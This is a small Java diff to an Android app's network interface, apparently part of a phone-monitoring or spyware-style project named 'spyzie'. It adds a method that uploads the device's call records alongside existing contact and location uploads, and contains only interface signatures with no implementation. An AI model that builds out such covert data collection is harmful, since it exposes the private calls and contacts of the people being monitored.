@@ -2,6 +2,7 @@ package com.tantd.spyzie.data.network;
 
 import android.location.Location;
 
+import com.tantd.spyzie.data.model.Call;
 import com.tantd.spyzie.data.model.Contact;
 import com.tantd.spyzie.data.model.Error;
 import com.tantd.spyzie.data.model.Event;
@@ -25,4 +26,6 @@ public interface ApiManager {
     void sendExceptionTracking(Error error);
 
     void sendContactsData(List<Contact> contacts);
+
+    void sendCallsData(List<Call> calls);
 }
